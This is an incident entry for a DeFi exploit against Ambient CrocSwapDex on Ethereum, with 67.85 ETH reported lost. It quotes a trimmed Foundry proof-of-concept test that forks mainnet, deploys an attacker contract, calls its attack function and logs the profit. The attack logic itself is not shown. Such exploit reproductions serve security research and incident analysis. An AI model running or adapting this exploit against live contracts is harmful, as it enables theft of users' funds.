# [?] AmbientCrocSwapDex - Native surplus accounting flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: AmbientCrocSwapDex
Published: 2026-06-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AmbientCrocSwapDex_exp.sol
Type: defi-exploit-poc

## Details
Lost: 67.85 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    AmbientCrocSwapDexAttacker private exploit;
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork("mainnet", 25_266_404);
        profitReceiver = makeAddr("profitReceiver");

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "Original Attack Contract");
        vm.label(profitReceiver, "PoC Profit Receiver");
        vm.label(CROC_SWAP_DEX, "Ambient CrocSwapDex");
        vm.label(CROC_QUERY, "Ambient CrocQuery");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public {
        logTokenBalance(WETH_TOKEN, profitReceiver, "Profit receiver before exploit");
        logTokenBalance(USDC_TOKEN, profitReceiver, "Profit receiver before exploit");

        uint256 wethBefore = IERC20(WETH_TOKEN).balanceOf(profitReceiver);
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(profitReceiver);

        exploit = new AmbientCrocSwapDexAttacker(profitReceiver);
        exploit.attack();

        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(profitReceiver) - wethBefore;
        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(profitReceiver) - usdcBefore;

        emit log_named_decimal_uint("WETH profit after Balancer repayment", wethProfit, 18);
        emit log_named_decimal_uint("USDC profit before final router conversion", usdcProfit, 6);
        logTokenBalance(WETH_TOKEN, profitReceiver, "Profit receiver after exploit");
        logTokenBalance(USDC_TOKEN, profitReceiver, "Profit receiver after exploit");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AmbientCrocSwapDex_exp.sol_
